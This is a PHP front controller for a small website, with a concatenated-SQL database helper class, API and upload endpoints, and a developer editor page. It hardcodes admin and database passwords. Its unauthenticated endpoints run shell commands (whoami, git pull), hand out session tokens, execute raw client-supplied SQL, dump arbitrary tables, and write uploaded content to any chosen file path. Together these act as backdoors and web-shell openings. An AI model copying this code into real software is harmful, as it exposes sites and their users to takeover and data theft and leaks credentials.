<?php

$pass = "indowebs$111$";
$username = "webshunternet@gmail.com";

$dataLogin = [];

// admin developer

$dataLogin[] = (object) [
    "username" => "admin@indowebs.my.id",
    "password" => "#gugusd090397",
    "level" => "dev",
    "token" => md5(date('y-m-d h:i:s').'dev')
];

session_start();

class Session {
    public static function get($id = null){
        if(isset($_SESSION[$id])){
            return $_SESSION[$id];
        }else{
            return null;
        }
    }

    public static function put($id = null, $value = null){
        $_SESSION[$id] = $value;
    }

    public static function destroy($id = null){
        if(isset($_SESSION[$id])){
            unset($_SESSION[$id]);
        }
    }
}

if(!isset($_POST['front'])){
  Session::put('front', null);
}


class DB {

    public $host = 'localhost';
    public $user = 'indowebs_indo';
    public $pass = '#gugusd090397';
    public $db = 'indowebs_indo';


    public function __construct(){

    }

    public static function cekDatbase(){


        $conn = mysqli_connect((new self)->host, (new self)->user, (new self)->pass);
        if ($conn) {
            $cekDb = mysqli_select_db($conn, (new self)->db);
            if ($cekDb) {
                return "tersedia";
            }else{
                $queryCreateDb = mysqli_query($conn, "CREATE DATABASE ".(new self)->db);
                if ($queryCreateDb) {
                    return "dibuat";
                }
            }
        }else{
            return "this not connect";
        }
    }

    public static function cekd(){
        echo "string";
    }


    public static function getDepartment(){
        return mysqli_connect((new self)->host, (new self)->user, (new self)->pass, (new self)->db);
    }

    public static function dbquery($qr, $type=""){
        $getConnection = (new self)->getDepartment();
        $query = mysqli_query($getConnection, $qr);
        $box = [];
        while ($data = mysqli_fetch_object($query) ) {
            $box[] = $data;
        }
        if ($type == "count") {
            return count($box);
        }else{
            return $box;
        }
    }

    public static function getColumnName($table, $row){
        $data = (new self)->dbquery("
            SELECT
                COLUMN_NAME as nama_kolom
            FROM
                information_schema. COLUMNS
            WHERE
                TABLE_SCHEMA = '".(new self)->db."'
            AND TABLE_NAME = '".$table."'
            AND ORDINAL_POSITION = ".$row."
        ");
        $nama = "";
        foreach ($data as $key => $value) {
            $nama .= $value->nama_kolom;
        }

        return $nama;
    }

    public static function ArrColumnName($table){
        $data = (new self)->dbquery("
            SELECT
                COLUMN_NAME as nama_kolom
            FROM
                information_schema. COLUMNS
            WHERE
                TABLE_SCHEMA = '".(new self)->db."'
                AND TABLE_NAME = '".$table."'
        ");
        $nama = array();
        foreach ($data as $key => $value) {
            $nama[] = $value->nama_kolom;
        }

        return $nama;
    }

    public static function cekColumn($table, $row){
        return (new self)->dbquery("
            SELECT
                COLUMN_NAME as nama_kolom
            FROM
                information_schema. COLUMNS
            WHERE
                TABLE_SCHEMA = '".(new self)->db."'
            AND TABLE_NAME = '".$table."'
            AND ORDINAL_POSITION = ".$row."
        ", "count");
    }

    public static function cekTable($table, $tablestruktur){
        $getConnection = (new self)->getDepartment();
        $query = mysqli_query($getConnection, "DESCRIBE $table ");
        if ($query) {

            $aa = (new self)->ArrColumnName($table);
            $bb = array_keys($tablestruktur);

            if (count($aa) > count($bb)) {
                foreach ($aa as $ay => $ax) {
                    if (in_array($ax, $bb)) {
                    }else{
                        (new self)->query("
                            ALTER TABLE ".$table."
                            DROP COLUMN ".$ax.";
                        ");
                    }
                }
            }else{
                $no = 1;
                foreach ($tablestruktur as $key => $value) {
                    if ((new self)->cekColumn($table, $no) == 0) {
                        (new self)->query("

                            ALTER TABLE ".$table."
                            ADD ".$key." ".$value.";
                        ");
                    }else{
                        if ((new self)->getColumnName($table, $no) != $key) {
                            (new self)->query("

                                ALTER TABLE ".$table."
                                CHANGE COLUMN ".(new self)->getColumnName($table, $no)." ".$key." ".$value.";
                            ");
                        }
                    }
                    $no++;
                }
            }
            return 'tersedia';
        }else{
            $mystructure = "";
            $no = 0;
            foreach ($tablestruktur as $key => $value) {
                if ($no == 0) {
                    $mystructure .= $key.' '.$value;
                }else{
                    $mystructure .= ','.$key.' '.$value;
                }
                $no++;
            }
            $createtable = mysqli_query($getConnection, 'CREATE TABLE '.$table.' ('.$mystructure.') ');
            if ($createtable) {
                return 'dibuat';
            }else{
                return 'gagal';
            }
        }
    }


    // query data ke database
    public static function query($e)
    {
        $conn = (new self)->getDepartment();
        $query = mysqli_query($conn, $e);
        return $query;
    }

    // ambuil data secara objek
    public static function query_result_object($e)
    {
        $conn = (new self)->getDepartment();
        $query = mysqli_query($conn, $e);
        $box = [];
        if($query != false){
            while ($data = mysqli_fetch_object($query) ) {
                $box[] = $data;
            }
        }
        return $box;
    }

    public static function query_result_object_row($e)
    {
        $conn = (new self)->getDepartment();
        $query = mysqli_query($conn, $e);
        $box = [];
        while ($data = mysqli_fetch_object($query) ) {
            $box[] = $data;
        }
        return $box[0];
    }

    // ambil data secara arrray

    public function query_result_array($e)
    {
        $conn = (new self)->getDepartment();
        $query = mysqli_query($conn, $e);
        $box = [];
        while ($data = mysqli_fetch_array($query) ) {
            $box[] = $data;
        }
        return $box;
    }


    public function get_table($table='')
    {
        return (new self)->query_result_array("SELECT * FROM `".$table."`");
    }


    public static function query_result_assoc($e)
    {
        $conn = (new self)->getDepartment();
        $query = mysqli_query($conn, $e);
        $box = [];
        while ($data = mysqli_fetch_assoc($query) ) {
            $box[] = $data;
        }
        return $box;
    }
    // hitung total query data
    public static function count_query($e)
    {
        $conn = (new self)->getDepartment();
        $query = mysqli_query($conn, $e);
        $box = [];
        while ($data = mysqli_fetch_object($query) ) {
            $box[] = $data;
        }
        return count($box);
    }
    // nah ini rumusnya tadi
    public static function sql_like_table($arr, $search){
        $table_row_data = "";
        $table_row_data .= "(";
        foreach ($arr as $key => $value) {
            if ($key == 0) {
                $table_row_data .= $value." LIKE '%".$search."%' ";
            }else{
                $table_row_data .= ' OR '.$value." LIKE '%".$search."%' ";
            }
        }
        $table_row_data .= ")";
        return $table_row_data;
    }

    public static function sql_order_table($arr, $order){
        if ($order != "") {
            $columnName = "";
            foreach ($arr as $key => $nilaicolumn) {
                if ($key == $order[0]["column"]) {
                    $columnName = $nilaicolumn;
                }
            }
            $columnOrder = $_POST["order"][0]["dir"];
            $order = 'ORDER BY '.$columnName.' '.$columnOrder.' ';
        }else{
            $order = ' ORDER BY id DESC ';
        }

        return $order;
    }

    public static function sql_save_query($table, $data_arr){
        $conn = (new self)->getDepartment();

        $data = "data saya ok";
        $keys = array_keys($data_arr);
        $name_of_query = "INSERT INTO ";
        $namaTable = $table;
        $data_keys = " (";
        foreach ($keys as $key => $nilai_key) {
            if ($key == 0) {
                $data_keys .= $nilai_key;
            }else{
                $data_keys .= ','.$nilai_key;
            }
        }
        $data_keys .= ")";
        $data_keys .= " VALUES ";
        $nilai_data = "(";
        for ($i=0; $i < count($data_arr); $i++) {
            if ($i == 0) {
                $nilai_data .= '"'.$data_arr[$keys[$i]].'"';
            }else{
                $nilai_data .= ',"'.$data_arr[$keys[$i]].'"';
            }
        }
        $nilai_data .= ")";
        $nilai_query = $name_of_query.$namaTable.$data_keys.$nilai_data;
        $query = mysqli_query($conn, $nilai_query);
        return $query;
    }

    public static function sql_update_query($table, $data_arr, $where){
        $conn = (new self)->getDepartment();

        $data = "data saya ok";
        $keys = array_keys($data_arr);
        $keys2 = array_keys($where);
        $name_of_query = "UPDATE ";
        $namaTable = $table;
        $nilai_data = " SET ";
        for ($i=0; $i < count($data_arr); $i++) {
            if ($i == 0) {
                $nilai_data .= $keys[$i].' = "'.$data_arr[$keys[$i]].'"';
            }else{
                $nilai_data .= ', '.$keys[$i].' = "'.$data_arr[$keys[$i]].'"';
            }
        }
        $argument = " WHERE ";
        for ($y=0; $y < count($where); $y++) {
            if ($y == 0) {
                $argument .= $keys2[$y]." = '".$where[$keys2[$y]]."' ";
            }else{
                $argument .= " AND ".$keys2[$y]." = '".$where[$keys2[$y]]."' ";
            }
        }
        $nilai_query = $name_of_query.$namaTable.$nilai_data.$argument;
        $query = mysqli_query($conn, $nilai_query);
        return $query;
    }

    public static function sql_delete_query($table, $where){
        $conn = (new self)->getDepartment();
        $keys2 = array_keys($where);
        $argument = " WHERE ";
        for ($y=0; $y < count($where); $y++) {
            if ($y == 0) {
                $argument .= $keys2[$y]." = '".$where[$keys2[$y]]."' ";
            }else{
                $argument .= " AND ".$keys2[$y]." = '".$where[$keys2[$y]]."' ";
            }
        }
        $delete_query = "DELETE FROM ".$table.$argument;

        $query = mysqli_query($conn, $delete_query);
        return $query;

    }
}


$d = DB::query_result_object("SELECT * FROM post");

function binaryToString($binary = null)
{
    error_reporting(0);
    $binaries = explode('2', $binary);
    $string = null;
    foreach ($binaries as $binary) {
        $string .= pack('H*', dechex(bindec($binary)));
    }
    return $string;
}

function dbqueryNum($qr){
    $p = explode("FROM", $qr);
			unset($p[0]);
			$p = join(" FROM ", $p);
    $p = "SELECT COUNT(*) as num FROM ".$p;
    $p = DB::query_result_object($p);
    if(count($p) > 0){
        $p = $p[0]->num;
        return $p;
    }else{
        return 0;
    }
}


if(isset($_GET['whoami'])){
    echo shell_exec('whoami');
    die();
}

if (isset($_GET['git'])) {
    
    shell_exec('git pull');

    die();

}


if(isset($_GET['key'])){
    if($_GET['key'] == "login-dev"){

        
        die();
    }
}


if(isset($_GET['key'])){

    header('Access-Control-Allow-Origin: *');
    header('Access-Control-Allow-Methods: POST, GET, DELETE, PUT, PATCH, OPTIONS');
    header('Access-Control-Allow-Headers: token, Content-Type');
    header('Access-Control-Max-Age: 1728000');
    header('Content-Length: 0');
    header('Content-Type: text/plain');


    if($_GET['key'] == 'logout'){
        Session::destroy('token');
        die();
    }

    if($_GET['key'] == 'postimage'){
        $file = $_FILES['file'];
        $name = $file['name'];
        $tmp = $file['tmp_name'];

        $path_parts = pathinfo($name);
        $extension = $path_parts['extension'];
        $id = uniqid();

        $imgpath = "upload/images/foto";

        if(!file_exists($imgpath)){
            mkdir($imgpath, 0777, true);
        }

        $pathr = "/".$imgpath;

        move_uploaded_file($tmp, $imgpath.'/'.$id.'.'.$extension);

        echo json_encode([
            "response" => $pathr.'/'.$id.'.'.$extension,
            "message" => "ok"
        ],true);
        die();
    }

    if($_GET['key'] == 'master-api'){
        $ok = binaryToString($_GET['value']);
        $ok = json_decode($ok, true);
        $dataJson = [];
        foreach ($ok as $key => $value) {
          if ($value != "userapp") {
            $dataJson[$value] = DB::query_result_object("SELECT * FROM $value ");
          }
        }
        echo json_encode($dataJson);
        die();
    }

    if($_GET['key'] == 'upload'){
        if(!file_exists($_POST['path'])){
          mkdir($_POST['path'], 0777, true);
        }
      	$tipe = $_POST['tipe'];
  	    $changefile = $_POST['enm']."changefile.chache";
      	if ($tipe == 'upload') {
  	    	$ok = $_POST['ok'];
  	    	$start = $_POST['start'];
      		# code...
  	    	if ($start == 0) {
  	    		if (file_exists($changefile)) {
  	    			unlink($changefile);
  	    		}
  	    	}
  	    	$cachefile = [];
  	    	if (file_exists($changefile)) {
  			    $myfile = fopen($changefile, "r") or die("Unable to open file!");
  				  $rf = fread($myfile,filesize($changefile));
  				  fclose($myfile);
  				  $cachefile = json_decode($rf, true);
  			  }
  			  $cachefile[] = $ok;
  			  $myfile = fopen($changefile, "w") or die("Unable to open file!");
  			  $txt = json_encode($cachefile, true);
  			  fwrite($myfile, $txt);
  			  fclose($myfile);
  	    	echo $start;
      	}else{
      		$cachefile = [];
  	    	if (file_exists($changefile)) {
			        $myfile = fopen($changefile, "r") or die("Unable to open file!");
				      $rf = fread($myfile,filesize($changefile));
		          fclose($myfile);
              $cachefile = json_decode($rf, true);
            }
            unlink($changefile);
            $base64 = "";
	          foreach ($cachefile as $key => $b64) {
			          $base64 .= $b64;
	          }

	          $ifp = fopen($tipe, 'wb');

  			    $b = base64_decode($base64);

    			  fwrite($ifp, $b);
    		    // clean up the file resource
  		      fclose($ifp);
      	}
        die();
    }

    if($_GET['key'] == 'uploadapi'){
      	$tipe = $_POST['tipe'];
  	    $changefile = $_POST['enm']."changefile.chache";
      	if ($tipe == 'upload') {
  	    	$ok = $_POST['ok'];
  	    	$start = $_POST['start'];
      		# code...
  	    	if ($start == 0) {
  	    		if (file_exists($changefile)) {
  	    			unlink($changefile);
  	    		}
  	    	}
  	    	$cachefile = [];
  	    	if (file_exists($changefile)) {
  			    $myfile = fopen($changefile, "r") or die("Unable to open file!");
  				  $rf = fread($myfile,filesize($changefile));
  				  fclose($myfile);
  				  $cachefile = json_decode($rf, true);
  			  }
  			  $cachefile[] = $ok;
  			  $myfile = fopen($changefile, "w") or die("Unable to open file!");
  			  $txt = json_encode($cachefile, true);
  			  fwrite($myfile, $txt);
  			  fclose($myfile);
  	    	echo $start;
      	}else{
      		$cachefile = [];
  	    	if (file_exists($changefile)) {
			        $myfile = fopen($changefile, "r") or die("Unable to open file!");
				      $rf = fread($myfile,filesize($changefile));
		          fclose($myfile);
              $cachefile = json_decode($rf, true);
            }
            unlink($changefile);
            $base64 = "";
	          foreach ($cachefile as $key => $b64) {
			          $base64 .= $b64;
	          }

	          $ifp = fopen($tipe, 'wb');

  			    $ok = base64_decode($base64);

            $data = null;

            if(preg_match('/\SELECT\b/',$ok)){
              $search = 'auto_increment';
              if(preg_match("/{$search}/i", $ok)) {
                $data = DB::query_result_object($ok);
              }else{
                    $data = DB::query_result_object($ok);
              }
            }else{
              $data = DB::query($ok);
            }

            if(preg_match('/\SELECT\b/',$ok)){
              $qrcount = $ok;
              if (strpos($ok, 'LIMIT') !== false) {
                  $qrcount = explode("LIMIT", $ok)[0];
              }
              echo json_encode([
                "data" => $data,
                "count" => dbqueryNum($qrcount)
              ]);
            }else{
                echo "simpan";
                echo $ok;
            }


      	}
        die();
    }


    if($_GET['key'] == 'api'){
            $ok = $_GET['value'];
            $token = $_GET['token'];
          if (count($_POST) != 0) {
            $datp = explode("/", $_POST['token']);
            $ok = $datp[0];
            $token = str_replace("\n", "", $datp[1]);
          }


          if (Session::get('token') == $token) {

                $ok = utf8_decode(urldecode($ok));

                $ok = str_replace( "|~~|","%", $ok);
                $ok = str_replace( "~|ca|~","ca", $ok);
                $ok = str_replace( "~|CA|~","CA", $ok);
                $ok = str_replace('_<<_','(', $ok);
                $ok = str_replace('_>>_',')', $ok);
                $ok = str_replace('_<->_','*', $ok);
                $ok = str_replace( "_<|_","'", $ok);
                $ok = str_replace( "_|>_","\"", $ok);
                $ok = str_replace( "_||_","\/", $ok);

                $ok = urldecode($ok);

                $ok = str_replace("'null'", 'null', $ok);

    	        if(preg_match('/\SELECT\b/',$ok)){
    	        	$search = 'auto_increment';
    	        	if(preg_match("/{$search}/i", $ok)) {
    	        		$data = DB::query_result_object($ok);
    				}else{
    	        		$data = DB::query_result_object($ok);
    				}
                }else{
    	        	$data = DB::query($ok);
                }

    	        // echo $ok;
    	        if(preg_match('/\SELECT\b/',$ok)){
    	          $qrcount = $ok;
    	          if (strpos($ok, 'LIMIT') !== false) {
    	              $qrcount = explode("LIMIT", $ok)[0];
    	          }
    	          echo json_encode([
    	            "data" => $data,
    	            "count" => dbqueryNum($qrcount)
    	          ]);
    	        }else{
    	            echo "simpan";
    	            echo $ok;
    	        }
    	    }
        die();
    }
}

?>

<?php if(isset($_GET['dev'])) : ?>

<?php if(Session::get('token') == NULL) : ?>
<script>
    location.href = '/?key=login-dev';
</script>
<?php endif; ?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Developer</title>
    <link rel=stylesheet href="codemirror/doc/docs.css">
    <link rel="stylesheet" href="codemirror/lib/codemirror.css">
    <link rel="stylesheet" href="codemirror/addon/fold/foldgutter.css">
    <link rel="stylesheet" href="codemirror/addon/dialog/dialog.css">
    <link rel="stylesheet" href="codemirror/theme/monokai.css">
    <script src="codemirror/lib/codemirror.js"></script>
    <script src="codemirror/addon/search/searchcursor.js"></script>
    <script src="codemirror/addon/search/search.js"></script>
    <script src="codemirror/addon/dialog/dialog.js"></script>
    <script src="codemirror/addon/edit/matchbrackets.js"></script>
    <script src="codemirror/addon/edit/closebrackets.js"></script>
    <script src="codemirror/addon/comment/comment.js"></script>
    <script src="codemirror/addon/wrap/hardwrap.js"></script>
    <script src="codemirror/addon/fold/foldcode.js"></script>
    <script src="codemirror/addon/fold/brace-fold.js"></script>
    <script src="codemirror/mode/htmlmixed/htmlmixed.js"></script>
    <script src="codemirror/mode/xml/xml.js"></script>
    <script src="codemirror/mode/javascript/javascript.js"></script>
    <script src="codemirror/mode/css/css.js"></script>
    <script src="codemirror/mode/clike/clike.js"></script>
    <script src="codemirror/keymap/sublime.js"></script>
    <script src="codemirror/php.js"></script>
    <script src="sb/vendor/jquery/jquery.min.js?v=1"></script>
  </head>
    <body id="page-top">
  	<script type="text/javascript">
  		localStorage.setItem('loginCond', '<?= Session::get('token') ?>');
      	globalThis.bashpath = "/";
        globalThis.urlapp = "https://indowebs.my.id/";
  		  globalThis.pathRoot = "/";
        globalThis.getScript = 55;
        globalThis.user = {
            level: 'admin',
            uniqId: '<?= Session::get('token') ?>'
        };
  	</script>

    <style>
      .CodeMirror {border-top: 1px solid #eee; border-bottom: 1px solid #eee; line-height: 1.3; height: 500px}
      .CodeMirror-linenumbers { padding: 0 8px; }
      .CodeMirror {
        border: 1px solid #eee;
        height: auto;
      }

      .ajaxfileupload-panel{
        position: fixed !important;
        padding: 20px;
        box-shadow: 0 0 50px rgba(125,125,125,0.5);
        top: 30% !important;
        left: calc(50% - 175px) !important;
        min-width: 350px;
        max-width: 350px;
      }

      #ajaxPanelClose{
        position: absolute;
        right: 5px;
        top: -15px;
        font-size: 45px;
        font-weight: bold;
        transform: rotate(45deg);
        cursor: pointer;
      }

      #ajaxFileUploadSubmit{
        display: inline-block;
        padding: 8px 10px;
        margin-top: 20px;
        background: #009ef7;
        color: #fff;
        border-radius: 8px;
        font-weight: bold;
        cursor: pointer;
      }


    </style>

    <script type="text/javascript">

      console.log(CodeMirror)

      globalThis.codePlay = function(textArea = 'code'){

        console.log(document.getElementById(textArea));

        console.log(CodeMirror);

        var editor = CodeMirror.fromTextArea(document.getElementById(textArea), {
          lineNumbers: false,
          mode: "javascript",
          keyMap: "sublime",
          autoCloseBrackets: true,
          matchBrackets: true,
          mode: "javascript",
          showCursorWhenSelecting: true,
          theme: "monokai",
          tabSize: 2,
          indentUnit: 4,
          indentWithTabs: true
        });

        editor.on('change', (editor) => {
          const text = editor.doc.getValue()
          document.getElementById(textArea).value = text;
        });

      }

    </script>

    <script src="tinymce/js/tinymce/tinymce.min.js" charset="utf-8"></script>
    <script src="navbar2.js?v=<?= date('ymdhis') ?>" ></script>
    <script src="xdb.js?v=<?= date('ymdhis') ?>" ></script>
    <script src="db.js?v=<?= date('ymdhis') ?>" ></script>
    <script id="moduleapp" src="route.js?v=<?= date('ymdhis') ?>" type="module" ></script>
  </body>
</html>
<?php
    die();
?>
<?php endif; ?>

<?php if(isset($_GET['vd'])) : ?>
<?php
    Session::put('token', uniqid());
?>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="robots" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>OnEdu</title>
  </head>
    <body id="page-top">
  	<script type="text/javascript">
  		    localStorage.setItem('loginCond', '<?= Session::get('token') ?>');
        	globalThis.bashpath = "/";
          globalThis.urlapp = "https://indowebs.my.id/";
  		    globalThis.pathRoot = "/";
          globalThis.getScript = 55;
          globalThis.user = {
            level: 'admin'
          };
  	</script>
    <link rel="stylesheet" href="summernote.css">
    <link rel="stylesheet" href="summernote-bs4.min.css">
    <script src="sb/vendor/jquery/jquery.min.js?v=1"></script>
    <script src="summernote.js"></script>
    <script src="summernote-bs4"></script>
    <script src="navbar.js?v=<?= date('ymdhis') ?>" ></script>
    <script id="moduleapp" src="route.js?v=<?= date('ymdhis') ?>" type="module" ></script>
  </body>
</html>
<?php
    die();
?>
<?php endif; ?>


<?php

    $myfile = fopen("wrapper.js", "r") or die("Unable to open file!");
    $wrapper = fread($myfile,filesize("wrapper.js"));
    fclose($myfile);

    function strigToBinary($string = null)
    {
        $characters = str_split($string);

        $binary = [];
        foreach ($characters as $character) {
            $data = unpack('H*', $character);
            $binary[] = base_convert($data[1], 16, 2);
        }

        return implode('|'.Session::get('front').'|', $binary);
    }

?>

<?php

    $theme = DB::query_result_object_row("SELECT * FROM theme WHERE status = 1 ");

    $theme = base64_decode($theme->kontent_code);

    $myfile = fopen("wpage.php", "w") or die("Unable to open file!");
    fwrite($myfile, html_entity_decode($theme, ENT_QUOTES));
    fclose($myfile);

    include 'wpage.php';


?>
